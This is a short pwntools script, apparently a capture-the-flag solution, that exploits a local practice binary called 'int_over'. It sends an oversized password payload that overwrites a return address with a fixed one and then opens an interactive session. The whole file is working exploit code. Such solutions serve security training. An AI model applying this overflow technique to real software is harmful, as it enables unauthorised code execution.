from pwn import *
p = process("./int_over")
payload = b"a"*24 + p32(0x804868b)
payload += b"b"*(0x104 - len(payload))
p.recvuntil("Your choice:")
p.sendline("1")

p.recvuntil("Please input your username:\n")
p.sendline("sir")

p.recvuntil("Please input your passwd:\n")
p.sendline(payload)
p.interactive()
